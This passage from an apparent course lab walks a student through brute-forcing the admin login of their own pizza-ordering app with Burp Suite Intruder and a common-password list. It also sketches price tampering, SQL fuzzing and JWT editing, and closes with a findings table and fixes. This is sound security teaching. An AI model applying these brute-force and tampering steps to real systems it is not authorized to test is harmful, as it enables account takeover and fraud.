{"email":"a@jwt.com","password":"$$admin$$"}
```

(The `$$` markers indicate the injection point.)

3. Set the attack type to **Sniper** (single payload position)

4. Go to the **Intruder > Payloads** tab
5. Under Payload Options, add your password list. You can type them manually or load a file:
   - `admin`
   - `password`
   - `123456`
   - `pizza`
   - `test`
   - `letmein`
   - `welcome`
   - `admin123`
   - `qwerty`
   - `abc123`

**Step 5: Run the attack.**

1. Click **Start attack** (in Community Edition, this is rate-limited but still works)
2. A new window opens showing each request and response
3. Look at the **Status** and **Length** columns:
   - Failed logins will all have the same response length (the error message)
   - A successful login will have a **different (longer) response length** because it includes the token
4. Sort by Length to quickly find the successful attempt

What you should see: One row with a noticeably different response length. Click on it and check the response -- it should contain `"token":` and `"roles":[{"role":"admin"}]`.

Pro tip: The response length difference is the quickest way to spot a successful brute-force hit. You can also add a "Grep - Match" rule in the Options tab to highlight responses containing `"token"`.

**Step 6: Use Burp Suite for the other attacks.**

Now that you have Burp Suite set up, you can use it for the other attacks too:

- **Price manipulation:** Intercept the order request, change the price to 0, and forward it
- **SQL injection:** Use Intruder to fuzz the email field with SQL payloads
- **JWT analysis:** The Proxy history shows you the token in every request, and there are Burp extensions (like JWT Editor) that let you decode and modify tokens inline

### Recording your attack

Screenshot:
1. Burp Suite Proxy showing the intercepted login request
2. The Intruder tab with your password list configured
3. The attack results window showing the successful hit (different response length)
4. The response body of the successful hit showing the admin token

For your deliverable table:
- **Severity: 3 (High)** -- admin credential brute-forced
- **Classification: A07:2021 Identification and Authentication Failures**

### How to fix it

Same fixes as Attack 4, plus:
- **Implement account lockout** -- lock the account after 5 failed attempts for 15 minutes
- **Add CAPTCHA** after 3 failed login attempts
- **Implement IP-based rate limiting on auth endpoints** -- much stricter than the global 1000/min limit
- **Use fail2ban or similar** at the infrastructure level to block IPs with repeated failures

---

## Wrapping Up

You just executed 7 attacks across 5 OWASP Top 10 categories. Here is a summary of what you found:

| # | Attack | OWASP | Severity | One-line summary |
|---|--------|-------|----------|-----------------|
| 1 | SQL Injection via PUT /api/user | A03 Injection | 4 (Critical) | Unsanitized input allows full database extraction |
| 2 | Unauthenticated Franchise Deletion | A01 Broken Access Control | 4 (Critical) | Missing auth middleware on destructive endpoint |
| 3 | Free Pizza / Price Manipulation | A04 Insecure Design | 3 (High) | Server trusts client-supplied prices |
| 4 | Default Admin Credentials | A07 Authentication Failures | 3 (High) | Hardcoded admin account with known password |
| 5 | JWT Token Forgery | A02 Cryptographic Failures | 3 (High) | Default signing secret allows token forgery |
| 6 | Information Disclosure | A05 Security Misconfiguration | 2 (Medium) | Stack traces, DB host, coverage data exposed |
| 7 | Burp Suite Brute-Force | A07 Authentication Failures | 3 (High) | No login rate limiting enables credential stuffing |

### Tips for your deliverable report

- **Take screenshots as you go.** It is much harder to recreate them after the fact.
- **Include the full curl command AND the full response** for each attack. The graders want to see both sides of the conversation.
- **If an attack fails, document it anyway** with severity 0. It shows you tried, and if the vulnerability was patched, that is good to note.
- **Clean up after yourself.** Delete any test franchises or users you created. You are attacking your own system, but leave it in a usable state.
- **Timestamp everything.** Include the date on each attack record for your deliverable.

### The bigger picture

Every one of these vulnerabilities exists because of a single misplaced assumption:
- SQL injection: "User input will be well-formed"
- Broken access control: "Nobody will call this endpoint without the UI"
- Price manipulation: "The client will send the right price"
- Default credentials: "Someone will change this before production"
- JWT forgery: "The secret key is secret"
- Information disclosure: "Error details help with debugging"

The common thread? **Never trust the client. Never trust defaults. Never assume.** That mindset -- questioning every assumption -- is what separates a secure system from a vulnerable one.

Good luck with your deliverable, and welcome to the world of security testing.
